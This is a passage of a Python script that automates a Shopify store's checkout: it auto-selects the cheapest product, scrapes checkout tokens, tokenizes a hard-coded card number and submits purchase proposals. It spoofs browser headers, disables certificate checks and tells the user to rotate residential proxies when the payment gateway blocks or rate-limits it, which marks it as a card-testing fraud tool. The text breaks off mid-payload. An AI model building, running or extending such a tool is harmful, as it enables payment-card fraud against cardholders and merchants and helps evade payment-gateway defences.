
import requests
import json
import uuid
import time
import random
import re
import urllib3
import sys

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="ignore")
    sys.stderr.reconfigure(encoding="utf-8", errors="ignore")
except Exception:
    pass
import os
from urllib.parse import urljoin, urlparse
import xml.etree.ElementTree as ET

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

SHOP_URL = "https://nasty-baggers-inc.myshopify.com"
VARIANT_ID = None

CHECKOUT_DATA = {
    "email": "test@example.com",
    "first_name": "John",
    "last_name": "Doe",
    "address1": "4024 College Point Boulevard",
    "city": "Flushing",
    "province": "NY",
    "zip": "11354",
    "country": "US",
    "phone": "2494851515",
    "coordinates": {
        "latitude": 40.7589,
        "longitude": -73.9851
    }
}

CARD_DATA = {
    "number": "4342580222985194",
    "month": 4,
    "year": 2028,
    "verification_value": "000",
    "name": "Test Card"
}

def create_session(shop_url, proxies=None):
    session = requests.Session()
    session.trust_env = False if proxies else True
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json',
        'Accept-Language': 'en-US',
        'Content-Type': 'application/json',
        'Origin': shop_url,
        'Referer': f'{shop_url}/',
    })
    if proxies:
        try:
            session.proxies.update(proxies)
        except Exception:
            pass
    return session

def normalize_shop_url(shop_url):
    if not shop_url.startswith(('http://', 'https://')):
        shop_url = f"https://{shop_url}"
    return shop_url

def get_minimum_price_product_details(json_data=None):
    valid_products = []
    
    if json_data:
        try:
            products = json_data if isinstance(json_data, list) else json_data.get('products', [])
            
            for product in products:
                product_id = product.get('id')
                product_title = product.get('title', 'Unknown')
                variants = product.get('variants', [])
                
                for variant in variants:
                    variant_id = variant.get('id')
                    price_str = variant.get('price', '0')
                    available = variant.get('available', False)
                    
                    try:
                        price = float(price_str)
                        
                        if available and price > 0:
                            valid_products.append({
                                'id': str(product_id),
                                'variant_id': str(variant_id),
                                'price': price,
                                'price_str': price_str,
                                'title': product_title,
                                'available': True
                            })
                    except (ValueError, TypeError):
                        continue
            
            if valid_products:
                valid_products.sort(key=lambda x: x['price'])
                return valid_products[0]
                
        except Exception as e:
            print(f"  [DEBUG] JSON parsing error: {e}")
    
    return None

def auto_detect_cheapest_product(session, shop_url):
    print("[0/5] Auto-detecting cheapest product...")
    
    time.sleep(random.uniform(0.5, 1.5))

    all_found_products = []

    def choose_from_products_list(products, collect_all=False):
        valid_candidates = []
        
        for product in products or []:
            try:
                pt = product.get('title') or 'Unknown'
                pid = str(product.get('id') or "")
                variants = product.get('variants') or []
                for v in variants:
                    vid = str(v.get('id') or "")
                    price_str = str(v.get('price') or v.get('price_amount') or "0")
                    try:
                        price = float(price_str)
                    except Exception:
                        continue
                    
                    if price <= 0:
                        continue
                    
                    available = v.get('available', None)
                    if available is None:
                        inv_q = v.get('inventory_quantity')
                        inv_pol = (v.get('inventory_policy') or "").lower()
                        available = (isinstance(inv_q, (int, float)) and inv_q > 0) or inv_pol == "continue"
                    if not available:
                        continue
                    
                    candidate = (pid, vid, price, price_str, pt)
                    valid_candidates.append(candidate)
                    if collect_all:
                        all_found_products.append(candidate)
            except Exception:
                continue
        
        if valid_candidates:
            valid_candidates.sort(key=lambda x: x[2])
            return valid_candidates[0]
        
        return None

    try:
        time.sleep(random.uniform(0.3, 0.8))
        url = f"{shop_url}/products.json?limit=250"
        r = session.get(url, timeout=HTTP_TIMEOUT_SHORT, verify=False)
        if r.status_code == 200:
            data = r.json()
            products = data if isinstance(data, list) else data.get('products', [])
            best = choose_from_products_list(products, collect_all=True)
            if best:
                pid, vid, price, price_str, title = best
                print(f"  ✅ Cheapest product found via products.json: {title} ${price_str}")
                return pid, vid, price_str, title
    except Exception:
        pass

    try:
        time.sleep(random.uniform(0.3, 0.8))
        url = f"{shop_url}/collections/all/products.json?limit=250"
        r = session.get(url, timeout=HTTP_TIMEOUT_SHORT, verify=False)
        if r.status_code == 200:
            data = r.json()
            products = data if isinstance(data, list) else data.get('products', [])
            best = choose_from_products_list(products, collect_all=True)
            if best:
                pid, vid, price, price_str, title = best
                print(f"  ✅ Cheapest product found via collections/all: {title} ${price_str}")
                return pid, vid, price_str, title
    except Exception:
        pass

    if FAST_MODE:
        print("  [FAST] Skipping slow sitemap/predictive search in FAST_MODE")
        if all_found_products:
            random_product = random.choice(all_found_products)
            pid, vid, price, price_str, title = random_product
            print(f"  🎲 Random product selected (FAST_MODE): {title} ${price_str}")
            return pid, vid, price_str, title
        return None, None, None, None

    handles = []
    try:
        url = f"{shop_url}/sitemap_products_1.xml"
        r = session.get(url, timeout=HTTP_TIMEOUT_SHORT, verify=False)
        if r.status_code == 200 and r.text:
            try:
                root = ET.fromstring(r.text)
                ns = {'sm': 'http://www.sitemaps.org/schemas/sitemap/0.9'}
                for loc in root.findall('.//sm:url/sm:loc', ns):
                    loc_text = (loc.text or "").strip()
                    if not loc_text:
                        continue
                    m = re.search(r"/products/([^/?#]+)", loc_text)
                    if m:
                        handles.append(m.group(1))
                    if len(handles) >= 10:
                        break
            except Exception:
                pass
    except Exception:
        pass

    best = None
    for handle in handles:
        try:
            url = f"{shop_url}/products/{handle}.js"
            r = session.get(url, timeout=HTTP_TIMEOUT_MEDIUM, verify=False)
            if r.status_code != 200:
                continue
            data = r.json()
            product = {
                "id": data.get('id'),
                "title": data.get('title'),
                "variants": data.get('variants', [])
            }
            cand = choose_from_products_list([product], collect_all=True)
            if cand and ((best is None) or cand[2] < best[2]):
                best = cand
        except Exception:
            continue
    if best:
        pid, vid, price, price_str, title = best
        print(f"  ✅ Cheapest product found via sitemap: {title} ${price_str}")
        return pid, vid, price_str, title

    try:
        url = f"{shop_url}/search/suggest.json?q=a&resources[type]=product&resources[limit]=10"
        r = session.get(url, timeout=HTTP_TIMEOUT_MEDIUM, verify=False)
        if r.status_code == 200:
            data = r.json()
            res = data.get('resources', {}).get('results', {}).get('products', []) if isinstance(data, dict) else []
            products = []
            for p in res:
                handle = p.get('handle')
                if not handle:
                    continue
                try:
                    pr = session.get(f"{shop_url}/products/{handle}.js", timeout=HTTP_TIMEOUT_MEDIUM, verify=False)
                    if pr.status_code != 200:
                        continue
                    pdata = pr.json()
                    products.append({
                        "id": pdata.get('id'),
                        "title": pdata.get('title'),
                        "variants": pdata.get('variants', [])
                    })
                except Exception:
                    continue
            best = choose_from_products_list(products, collect_all=True)
            if best:
                pid, vid, price, price_str, title = best
                print(f"  ✅ Cheapest product found via predictive search: {title} ${price_str}")
                return pid, vid, price_str, title
    except Exception:
        pass

    if all_found_products:
        random_product = random.choice(all_found_products)
        pid, vid, price, price_str, title = random_product
        print(f"  🎲 Random product selected (fallback): {title} ${price_str}")
        return pid, vid, price_str, title

    print(f"  ❌ Could not auto-detect any products")
    return None, None, None, None

def step1_add_to_cart(session):
    print("[1/5] Adding to cart and creating checkout...")
    
    add_url = f"{SHOP_URL}/cart/add.js"
    payload = {"id": VARIANT_ID, "quantity": 1}
    
    try:
        r = session.post(add_url, json=payload, timeout=HTTP_TIMEOUT_SHORT, verify=False)
        print(f"  Add to cart: {r.status_code}")
    except Exception as e:
        print(f"  [ERROR] Add to cart request failed: {e}")
        raise
    
    checkout_url = f"{SHOP_URL}/checkout"
    try:
        r = session.get(checkout_url, allow_redirects=True, timeout=HTTP_TIMEOUT_SHORT, verify=False)
    except Exception as e:
        print(f"  [ERROR] Checkout init request failed: {e}")
        raise
    
    final_url = r.url
    if '/checkouts/cn/' in final_url:
        checkout_token = final_url.split('/checkouts/cn/')[1].split('/')[0]
        print(f"  [OK] Checkout token: {checkout_token}")
        
        session_token = extract_session_token(r.text)
        
        return checkout_token, session_token, r.cookies
    
    return None, None, None

def extract_session_token(html):
    from html import unescape
    
    meta_pattern = r'<meta\s+name="serialized-session-token"\s+content="([^"]+)"'
    meta_match = re.search(meta_pattern, html)
    
    if meta_match:
        content = unescape(meta_match.group(1))
        token = content.strip('"')
        if len(token) > 50:
            print(f"  [OK] Session token extracted")
            return token
    
    print("  [WARNING] Session token not found")
    return None

def step2_tokenize_card(session, checkout_token):
    print("[2/5] Tokenizing credit card...")

    try:
        scope_host = urlparse(SHOP_URL).netloc or SHOP_URL.replace('https://', '').replace('http://', '').split('/')[0]
    except Exception:
        scope_host = SHOP_URL.replace('https://', '').replace('http://', '').split('/')[0]

    payload = {
        "credit_card": {
            "number": CARD_DATA["number"],
            "month": CARD_DATA["month"],
            "year": CARD_DATA["year"],
            "verification_value": CARD_DATA["verification_value"],
            "start_month": None,
            "start_year": None,
            "issue_number": "",
            "name": CARD_DATA["name"]
        },
        "payment_session_scope": scope_host
    }

    endpoints = [
        ("https://checkout.pci.shopifyinc.com/sessions", "https://checkout.pci.shopifyinc.com", "https://checkout.pci.shopifyinc.com/"),
    ]

    last_status = None
    last_text_head = None

    for ep_url, origin, referer in endpoints:
        headers = {
            "Origin": origin,
            "Referer": referer,
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Sec-CH-UA": '"Chromium";v="129", "Google Chrome";v="129", "Not=A?Brand";v="99"',
            "Sec-CH-UA-Mobile": "?0",
            "Sec-CH-UA-Platform": '"Windows"',
            "User-Agent": session.headers.get("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129 Safari/537.36"),
        }

        try:
            r = session.post(ep_url, json=payload, headers=headers, timeout=HTTP_TIMEOUT_SHORT, verify=False)
        except Exception as e:
            print(f"  [TOKEN] Request exception at {urlparse(ep_url).netloc}: {e}")
            continue

        last_status = r.status_code
        try:
            last_text_head = r.text[:300]
        except Exception:
            last_text_head = None

        if r.status_code == 200:
            try:
                token_data = r.json()
            except Exception:
                print(f"  [TOKEN] Invalid JSON from {urlparse(ep_url).netloc}")
                continue

            card_session_id = token_data.get("id")
            if card_session_id:
                print(f"  [OK] Card session ID: {card_session_id} via {urlparse(ep_url).netloc}")
                return card_session_id
            else:
                errs = token_data.get("errors") or token_data.get("error")
                if errs:
                    try:
                        print(f"  [TOKEN] {urlparse(ep_url).netloc} errors: {errs}")
                    except Exception:
                        pass
                continue
        else:
            if r.status_code == 403:
                print(f"  [TOKEN] 403 Forbidden - Proxy/IP blocked by payment gateway")
                print(f"  [TOKEN] This is a proxy issue, not a site issue")
            else:
                print(f"  [TOKEN] {urlparse(ep_url).netloc} HTTP {r.status_code}")
            continue

    if last_status == 403:
        print(f"  [ERROR] Tokenization blocked: 403 Forbidden")
        print(f"  [PROXY ISSUE] Payment gateway blocked your IP/proxy")
        print(f"  [SOLUTION] Try: 1) Different proxy, 2) Residential proxy, 3) Wait cooldown")
    elif last_status == 429:
        print(f"  [ERROR] Tokenization rate limited: 429 Too Many Requests")
        print(f"  [SOLUTION] Rotate proxy or wait before retry")
    else:
        print(f"  [ERROR] Tokenization failed across endpoints. last_status={last_status} head={last_text_head}")
    
    return None

def get_delivery_line_config(shipping_handle="any", destination_changed=True, merchandise_stable_id=None, use_full_address=False, phone_required=False):
    address_key = "streetAddress" if use_full_address else "partialStreetAddress"

    address_data = {
        "address1": CHECKOUT_DATA["address1"],
        "city": CHECKOUT_DATA["city"],
        "countryCode": CHECKOUT_DATA["country"],
        "firstName": CHECKOUT_DATA["first_name"],
        "lastName": CHECKOUT_DATA["last_name"],
        "zoneCode": CHECKOUT_DATA["province"],
        "postalCode": CHECKOUT_DATA["zip"],
        "phone": CHECKOUT_DATA["phone"]
    }

    if not use_full_address:
        address_data["address2"] = ""
        address_data["oneTimeUse"] = False
        address_data["coordinates"] = CHECKOUT_DATA.get("coordinates", {
            "latitude": 40.7589,
            "longitude": -73.9851
        })

    config = {
        "destination": {
            address_key: address_data
        },
        "targetMerchandiseLines": {"any": True} if not merchandise_stable_id else {"lines": [{"stableId": merchandise_stable_id}]},
        "deliveryMethodTypes": ["SHIPPING"],
        "destinationChanged": destination_changed,
        "selectedDeliveryStrategy": {
            "deliveryStrategyByHandle": {
                "handle": shipping_handle,
                "customDeliveryRate": False
            }
        },
        "expectedTotalPrice": {"any": True}
    }

    if phone_required:
        try:
            config["selectedDeliveryStrategy"]["options"] = {"phone": CHECKOUT_DATA["phone"]}
        except Exception:
            config["selectedDeliveryStrategy"]["options"] = {"phone": str(CHECKOUT_DATA.get("phone", "") or "")}

    return config

def poll_for_delivery_and_expectations(session, checkout_token, session_token, merchandise_stable_id, max_attempts=7):
    print(f"  [POLL] Waiting for delivery terms and expectations...")
    
    url = f"{SHOP_URL}/checkouts/unstable/graphql?operationName=Proposal"
    
    headers = {
        'shopify-checkout-client': 'checkout-web/1.0',
        'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
        'x-checkout-web-source-id': checkout_token,
        'x-checkout-one-session-token': session_token,
    }
    
    query = """query Proposal($delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$tip:TipTermInput,$note:NoteInput,$scriptFingerprint:ScriptFingerprintInput,$optionalDuties:OptionalDutiesInput,$cartMetafields:[CartMetafieldOperationInput!],$memberships:MembershipsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,tip:$tip,note:$note,scriptFingerprint:$scriptFingerprint,optionalDuties:$optionalDuties,cartMetafields:$cartMetafields,memberships:$memberships}}){__typename result{...on NegotiationResultAvailable{queueToken sellerProposal{deliveryExpectations{...on FilledDeliveryExpectationTerms{deliveryExpectations{signedHandle __typename}__typename}...on PendingTerms{pollDelay __typename}__typename}delivery{...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{...on CompleteDeliveryStrategy{handle phoneRequired amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}}}}"""
    
    delivery_line = {
        "destination": {
            "partialStreetAddress": {
                "address1": CHECKOUT_DATA["address1"],
                "city": CHECKOUT_DATA["city"],
                "countryCode": CHECKOUT_DATA["country"],
                "firstName": CHECKOUT_DATA["first_name"],
                "lastName": CHECKOUT_DATA["last_name"],
                "zoneCode": CHECKOUT_DATA["province"],
                "postalCode": CHECKOUT_DATA["zip"],
                "phone": CHECKOUT_DATA["phone"],
                "oneTimeUse": False
            }
        },
        "targetMerchandiseLines": {"lines": [{"stableId": merchandise_stable_id}]},
        "deliveryMethodTypes": ["SHIPPING"],
        "destinationChanged": False,
        "selectedDeliveryStrategy": {
            "deliveryStrategyByHandle": {
                "handle": "any",
                "customDeliveryRate": False
            }
        },
        "expectedTotalPrice": {"any": True}
    }
    
    billing_address_data = {
        "address1": CHECKOUT_DATA["address1"],
        "city": CHECKOUT_DATA["city"],
        "countryCode": CHECKOUT_DATA["country"],
        "firstName": CHECKOUT_DATA["first_name"],
        "lastName": CHECKOUT_DATA["last_name"],
        "zoneCode": CHECKOUT_DATA["province"],
        "postalCode": CHECKOUT_DATA["zip"],
        "phone": CHECKOUT_DATA["phone"]
    }
    
    payload = {
        "operationName": "Proposal",
        "query": query,
        "variables": {
            "delivery": {
                "deliveryLines": [delivery_line],
                "noDeliveryRequired": [],
                "supportsSplitShipping": True
            },
            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": {"streetAddress": billing_address_data}
            },
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": merchandise_stable_id,
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{VARIANT_ID}",
                            "variantId": f"gid://shopify/ProductVariant/{VARIANT_ID}",
                            "properties": [],
                            "sellingPlanId": None
                        }
                    },
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"any": True},
                    "lineComponents": []
                }]
            },
            "buyerIdentity": {
                "customer": {"presentmentCurrency": "USD", "countryCode": CHECKOUT_DATA["country"]},
                "email": CHECKOUT_DATA["email"]
            },
            "taxes": {"proposedTotalAmount": {"any": True}},
            "sessionInput": {"sessionToken": session_token},
            "tip": {"tipLines": []},
            "note": {"message": None, "customAttributes": []},
            "scriptFingerprint": {
                "signature": None,
                "signatureUuid": None,
                "lineItemScriptChanges": [],
                "paymentScriptChanges": [],
                "shippingScriptChanges": []
            },
            "optionalDuties": {"buyerRefusesDuties": False},
            "cartMetafields": [],
            "memberships": {"memberships": []}
        }
    }
    
    shipping_handle = None
    shipping_amount = None
    delivery_expectations = []
    queue_token = None
    
    for attempt in range(max_attempts):
        print(f"  Attempt {attempt + 1}/{max_attempts}...")
        
        r = session.post(url, json=payload, headers=headers, timeout=HTTP_TIMEOUT_SHORT, verify=False)
        
        if r.status_code != 200:
            print(f"  [ERROR] HTTP {r.status_code}")
            time.sleep(SHORT_SLEEP)
            continue
        
        try:
            response = r.json()
            
            if 'errors' in response:
                print(f"  [ERROR] GraphQL errors:")
                for error in response['errors']:
                    print(f"    - {error.get('message', 'Unknown')}")
                time.sleep(SHORT_SLEEP)
                continue
            
            result = response.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
            
            if result.get('__typename') != 'NegotiationResultAvailable':
                time.sleep(SHORT_SLEEP)
                continue
            
            queue_token = result.get('queueToken')
            seller_proposal = result.get('sellerProposal', {})
            
            delivery_terms = seller_proposal.get('delivery', {})
            delivery_typename = delivery_terms.get('__typename')
            
            delivery_exp_terms = seller_proposal.get('deliveryExpectations', {})
            exp_typename = delivery_exp_terms.get('__typename')
            
            checkout_total = seller_proposal.get('checkoutTotal', {})
            actual_total = None
            if checkout_total.get('__typename') == 'MoneyValueConstraint':
                actual_total = checkout_total.get('value', {}).get('amount')
            
            print(f"  Status - Delivery: {delivery_typename}, Expectations: {exp_typename}")
            
            if delivery_typename == 'FilledDeliveryTerms':
                delivery_lines = delivery_terms.get('deliveryLines', [])
                if delivery_lines:
                    strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
                    if strategies:
                        shipping_handle = strategies[0].get('handle')
                        amount_constraint = strategies[0].get('amount', {})
                        if amount_constraint.get('__typename') == 'MoneyValueConstraint':
                            shipping_amount = amount_constraint.get('value', {}).get('amount')
                        print(f"  ✓ Got shipping handle: {shipping_handle[:50] if shipping_handle else 'None'}...")
                        
                        delivery_line["selectedDeliveryStrategy"] = {
                            "deliveryStrategyByHandle": {
                                "handle": shipping_handle,
                                "customDeliveryRate": False
                            },
                            "options": {
                                "phone": CHECKOUT_DATA["phone"]
                            }
                        }
                        if shipping_amount:
                            delivery_line["expectedTotalPrice"] = {
                                "value": {"amount": str(shipping_amount), "currencyCode": "USD"}
                            }
                        
                        payload["variables"]["delivery"]["deliveryLines"][0] = delivery_line
            
            if exp_typename == 'FilledDeliveryExpectationTerms':
                expectations = delivery_exp_terms.get('deliveryExpectations', [])
                for exp in expectations:
                    signed_handle = exp.get('signedHandle')
                    if signed_handle:
                        delivery_expectations.append({"signedHandle": signed_handle})
                print(f"  ✓ Got {len(delivery_expectations)} delivery expectations")
            
            if shipping_handle and delivery_expectations and actual_total:
                print(f"  [POLL] ✓ Complete! Handle: {shipping_handle[:30]}..., Total: ${actual_total}")
                return queue_token, shipping_handle, shipping_amount, actual_total, delivery_expectations
            
            poll_delay = 500
            if delivery_typename == 'PendingTerms':
                poll_delay = delivery_terms.get('pollDelay', 500)
            elif exp_typename == 'PendingTerms':
                poll_delay = delivery_exp_terms.get('pollDelay', 500)
            
            wait_seconds = min(poll_delay / 1000.0, MAX_WAIT_SECONDS)
            time.sleep(wait_seconds)
            
        except Exception as e:
            print(f"  [ERROR] {e}")
            time.sleep(SHORT_SLEEP)
            continue
    
    print(f"  [POLL] Timed out after {max_attempts} attempts")
    return queue_token, shipping_handle, shipping_amount, actual_total, delivery_expectations

def detect_phone_requirement(seller_proposal):
    try:
        delivery_terms = seller_proposal.get('delivery', {})
        if delivery_terms.get('__typename') == 'FilledDeliveryTerms':
            delivery_lines = delivery_terms.get('deliveryLines', [])
            for line in delivery_lines:
                strategies = line.get('availableDeliveryStrategies', [])
                for strategy in strategies:
                    phone_required = strategy.get('phoneRequired', False)
                    if phone_required:
                        print(f"  [DETECT] ✓ Phone number IS required")
                        return True
        
        print(f"  [DETECT] Phone number NOT required")
        return False
    except Exception as e:
        print(f"  [DETECT] Error detecting: {e}")
        return True

def poll_proposal(session, checkout_token, session_token, merchandise_stable_id, shipping_handle, phone_required=False, shipping_amount=None, max_attempts=5):
    print(f"  [POLL] Polling for delivery expectations...")
    
    if not shipping_handle:
        print(f"  [POLL] No shipping handle available yet, skipping poll")
        return None, []
    
    url = f"{SHOP_URL}/checkouts/unstable/graphql?operationName=Proposal"
    
    headers = {
        'shopify-checkout-client': 'checkout-web/1.0',
        'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
        'x-checkout-web-source-id': checkout_token,
        'x-checkout-one-session-token': session_token,
    }
    
    query = """query Proposal($delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$tip:TipTermInput,$note:NoteInput,$scriptFingerprint:ScriptFingerprintInput,$optionalDuties:OptionalDutiesInput,$cartMetafields:[CartMetafieldOperationInput!],$memberships:MembershipsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,tip:$tip,note:$note,scriptFingerprint:$scriptFingerprint,optionalDuties:$optionalDuties,cartMetafields:$cartMetafields,memberships:$memberships}}){__typename result{...on NegotiationResultAvailable{queueToken sellerProposal{deliveryExpectations{...on FilledDeliveryExpectationTerms{deliveryExpectations{signedHandle __typename}__typename}...on PendingTerms{pollDelay __typename}__typename}__typename}__typename}__typename}}}}"""
    
    delivery_line = {
        "destination": {
            "partialStreetAddress": {
                "address1": CHECKOUT_DATA["address1"],
                "city": CHECKOUT_DATA["city"],
                "countryCode": CHECKOUT_DATA["country"],
                "firstName": CHECKOUT_DATA["first_name"],
                "lastName": CHECKOUT_DATA["last_name"],
                "zoneCode": CHECKOUT_DATA["province"],
                "postalCode": CHECKOUT_DATA["zip"],
                "phone": CHECKOUT_DATA["phone"],
                "oneTimeUse": False
            }
        },
        "targetMerchandiseLines": {"lines": [{"stableId": merchandise_stable_id}]},
        "deliveryMethodTypes": ["SHIPPING"],
        "destinationChanged": False,
        "selectedDeliveryStrategy": {
            "deliveryStrategyByHandle": {
                "handle": shipping_handle,
                "customDeliveryRate": False
            },
            "options": {
                "phone": CHECKOUT_DATA["phone"]
            }
        },
        "expectedTotalPrice": {"any": True}
    }
    
    if shipping_amount:
        delivery_line["expectedTotalPrice"] = {"value": {"amount": str(shipping_amount), "currencyCode": "USD"}}
    
    billing_address_data = {
        "address1": CHECKOUT_DATA["address1"],
        "city": CHECKOUT_DATA["city"],
        "countryCode": CHECKOUT_DATA["country"],
        "firstName": CHECKOUT_DATA["first_name"],
        "lastName": CHECKOUT_DATA["last_name"],
        "zoneCode": CHECKOUT_DATA["province"],
        "postalCode": CHECKOUT_DATA["zip"],
        "phone": CHECKOUT_DATA["phone"]
    }
    
    payload = {
        "operationName": "Proposal",
        "query": query,
        "variables": {
            "delivery": {
                "deliveryLines": [delivery_line],
                "noDeliveryRequired": [],
                "supportsSplitShipping": True
            },
            "discounts": {
                "lines": [],
                "acceptUnexpectedDiscounts": True
            },
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": {"streetAddress": billing_address_data}
            },
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": merchandise_stable_id,
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{VARIANT_ID}",
                            "variantId": f"gid://shopify/ProductVariant/{VARIANT_ID}",
                            "properties": [],
                            "sellingPlanId": None
                        }
                    },
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"any": True},
                    "lineComponents": []
                }]
            },
            "buyerIdentity": {
                "customer": {"presentmentCurrency": "USD", "countryCode": CHECKOUT_DATA["country"]},
                "email": CHECKOUT_DATA["email"]
            },
            "taxes": {"proposedTotalAmount": {"any": True}},
            "sessionInput": {"sessionToken": session_token},
            "tip": {"tipLines": []},
            "note": {"message": None, "customAttributes": []},
            "scriptFingerprint": {
                "signature": None,
                "signatureUuid": None,
                "lineItemScriptChanges": [],
                "paymentScriptChanges": [],
                "shippingScriptChanges": []
            },
            "optionalDuties": {"buyerRefusesDuties": False},
            "cartMetafields": [],
            "memberships": {"memberships": []}
        }
    }
    
    for attempt in range(max_attempts):
        print(f"  Attempt {attempt + 1}/{max_attempts}...")
        
        try:
            r = session.post(url, json=payload, headers=headers, timeout=HTTP_TIMEOUT_SHORT, verify=False)
        except Exception as e:
            print(f"  [ERROR] HTTP request failed: {e}")
            time.sleep(SHORT_SLEEP)
            continue
        
        if r.status_code == 200:
            try:
                response = r.json()
                
                if attempt == 0 and not SUMMARY_ONLY:
                    with open("poll_response.json", "w") as f:
                        json.dump(response, f, indent=2)
                
                if 'errors' in response:
                    print(f"  [ERROR] GraphQL errors:")
                    for error in response['errors']:
                        print(f"    - {error.get('message', 'Unknown')}")
                    time.sleep(2)
                    continue
                
                result = response.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
                seller_proposal = result.get('sellerProposal', {})
                delivery_exp_terms = seller_proposal.get('deliveryExpectations', {})
                
                typename = delivery_exp_terms.get('__typename')
                
                if typename == 'FilledDeliveryExpectationTerms':
                    print(f"  [POLL] ✓ Ready!")
                    
                    expectations = delivery_exp_terms.get('deliveryExpectations', [])
                    delivery_expectations = []
                    for exp in expectations:
                        signed_handle = exp.get('signedHandle')
                        if signed_handle:
                            delivery_expectations.append({"signedHandle": signed_handle})
                    
                    queue_token = result.get('queueToken')
                    print(f"  [POLL] Found {len(delivery_expectations)} expectations")
                    
                    return queue_token, delivery_expectations
                
                elif typename == 'PendingTerms':
                    poll_delay = delivery_exp_terms.get('pollDelay', 2000)
                    wait_seconds = min(poll_delay / 1000.0, 3.0)
                    time.sleep(wait_seconds)
                    continue
                else:
                    print(f"  [WARNING] Unexpected typename: {typename}")
                    time.sleep(2)
                    continue
                    
            except Exception as e:
                print(f"  [ERROR] {e}")
                time.sleep(2)
                continue
        else:
            print(f"  [ERROR] HTTP {r.status_code}")
            time.sleep(2)
            continue
    
    print(f"  [POLL] Timed out after {max_attempts} attempts")
    return None, []

def step3_proposal(session, checkout_token, session_token, card_session_id):
    print("[3/5] Submitting proposal...")
    
    url = f"{SHOP_URL}/checkouts/unstable/graphql?operationName=Proposal"
    merchandise_stable_id = str(uuid.uuid4())
    
    headers = {
        'shopify-checkout-client': 'checkout-web/1.0',
        'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
        'x-checkout-web-source-id': checkout_token,
        'x-checkout-one-session-token': session_token,
    }
    
    query = """query Proposal($delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$tip:TipTermInput,$note:NoteInput,$scriptFingerprint:ScriptFingerprintInput,$optionalDuties:OptionalDutiesInput,$cartMetafields:[CartMetafieldOperationInput!],$memberships:MembershipsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,tip:$tip,note:$note,scriptFingerprint:$scriptFingerprint,optionalDuties:$optionalDuties,cartMetafields:$cartMetafields,memberships:$memberships}}){__typename result{...on NegotiationResultAvailable{queueToken sellerProposal{deliveryExpectations{...on FilledDeliveryExpectationTerms{deliveryExpectations{signedHandle __typename}__typename}...on PendingTerms{pollDelay __typename}__typename}delivery{...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{...on CompleteDeliveryStrategy{handle phoneRequired amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}}}}"""
    
    delivery_line = get_delivery_line_config(
        shipping_handle="any",
        destination_changed=True,
        merchandise_stable_id=None,
        phone_required=True
    )
    
    billing_address_data = {
        "address1": CHECKOUT_DATA["address1"],
        "city": CHECKOUT_DATA["city"],
        "countryCode": CHECKOUT_DATA["country"],
        "firstName": CHECKOUT_DATA["first_name"],
        "lastName": CHECKOUT_DATA["last_name"],
        "zoneCode": CHECKOUT_DATA["province"],
        "postalCode": CHECKOUT_DATA["zip"],
        "phone": CHECKOUT_DATA["phone"]
    }
    
    payload = {
        "operationName": "Proposal",
        "query": query,
        "variables": {
            "delivery": {
                "deliveryLines": [delivery_line],
                "noDeliveryRequired": [],
                "supportsSplitShipping": True
            },
            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": {"streetAddress": billing_address_data}
            },
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": merchandise_stable_id,
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{VARIANT_ID}",
